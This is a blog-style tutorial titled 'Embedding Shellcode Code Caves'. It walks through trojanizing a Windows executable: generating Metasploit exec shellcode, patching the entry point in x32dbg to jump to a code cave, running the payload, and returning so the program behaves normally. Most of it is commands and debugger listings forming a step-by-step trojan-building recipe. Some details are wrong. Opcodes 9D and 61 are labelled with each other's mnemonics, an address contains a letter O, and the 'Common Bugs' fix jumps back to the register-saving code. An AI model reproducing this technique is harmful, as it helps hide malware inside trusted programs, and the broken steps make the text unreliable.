---
title: Embedding Shellcode Code Caves
date: 2026-02-22
tags:
    - C++
    - WinAPI
    - Metasploit
---

## Theory

Load malicious bytes into the “code cave” of a portable executable.

>  This doesn’t change the file size, because you will be replacing bytes that already exist with malicious code.

Typically, when a PE file executes, it follows the instructions from top to bottom. In contrary, when a trojan executes, it will immediately jump to the section containing the shellcode, execute the it and then return back the top of the file and run the program as usual. 

## Practice

Generate shellcode using Metasploit.

```
use payload/windows/exec
set CMD calc.exe
set EXITFUNC thread
generate -f raw -o calc.bin
```

Alternatively, you can use a 64-bit shellcode using the following module.

```
use payload/windows/×64/exec
```

Use xxd to get an overfile of the shellcode.

```
xxd calc.bin
```

>  The final null byte indicates the end of the shellcode.

Create the following source file. *(Note that this is C, and not C++)*

```cpp
#include <windows.h>
#pragma comment (lib, "user32.lib")

int main(VOID) {
  
  MessageBox (
    NULL,
    "My first trojan!",
    "Malware Development",
    MB_ICONEXCLAMATION | MB_OK
  );
  
  return 0;
}
```

Compile the source code.

```
cl.exe /Zi /EHsc /nologo /FeC:\path\to\save\output\file.exe C:\path\to\get\source\file.c
```

Launch `x32dbg.exe` and attach the portable executable.

First, take note of the entry point address.

```
002E1136 | E9 C1630000            | jmp ‹main._mainCRTStartup>    |
```

Second, take note of the “code cave” address.

```
00345D2C |    0000                | add byte ptr ds:[eax],al      |
```

Override the entry point instruction to make jump to the address of the code cave.

```
jmp 00345D2C
```

>  Make sure to have “*Fill with NOPs*” and “*XED Parse*” options enabled.


The entry point should now be the following.

```
002E1136 | E9 F14B0600            | jmp main.345D2C                 |
```

Navigate to the code cave and override the first two lines to push all of the general registers and eflags on the stack, in order to have them saved and pulled back down later to have the program execute as usual.

```
00345D2C | 60                     | pushad                         |
00345D2D | 9C                     | pushfd                         |
```

Open the `calc.bin` in a HEX editor, such as *HxD* and copy the shellcode bytes.

Back in the *x32dbg* program, select enough lines and override them with the shellcode (SHIFT + DOWN and then CTRL + E).

After the shellcode has run, use popad and popfd to pull down the registers from the stack.

>  Do not forget that the shellcode payload ends with a null byte.


```
00345DEE | 0000                   | add byte ptr ds:[eax],al       |
00345DFO | 9D                     | popad                          |
00345DF1 | 61                     | popfd                          |
```

Restore the original command, that the entry point was supposed to run.

```
jmp _mainCRTStartup
```

The line would be automatically reformated to the following.

```
00345DF2 | E9 0517FAFF            | jmp ‹main._mainCRTStartup>     |
```

Lastly, jump to the address below the entry point to make the program continue execute as normal, from top to bottom.

```nasm
jmp 002E113B
```

The line would be automatically reformated to the following

```
00345DF7 | E9 3FB3F9FF            | jmp main.2E113B
```

## Common Bugs

Often times the shellcode with exit without executing the original program code. 

Place breakpoints on each call that the shellcode makes and follow through the debugging process till it executes the intended malicious command. Below it there should be an exit instruction, such as a `push 0` instruction, which should be replaced with a jump to to the part where the registers are stored on the stack (`jmp 00345D2C`).

## References

- [https://pdos.csail.mit.edu/6.828/2008/readings/i386/PUSHF.htm](https://pdos.csail.mit.edu/6.828/2008/readings/i386/PUSHF.htm)
- [https://pdos.csail.mit.edu/6.828/2008/readings/i386/PUSHA.htm](https://pdos.csail.mit.edu/6.828/2008/readings/i386/PUSHA.htm)
- [https://pdos.csail.mit.edu/6.828/2008/readings/i386/POPF.htm](https://pdos.csail.mit.edu/6.828/2008/readings/i386/POPF.htm)
- [https://pdos.csail.mit.edu/6.828/2008/readings/i386/POPA.htm](https://pdos.csail.mit.edu/6.828/2008/readings/i386/POPA.htm)
- [https://mh-nexus.de/en/hxd/](https://mh-nexus.de/en/hxd/)
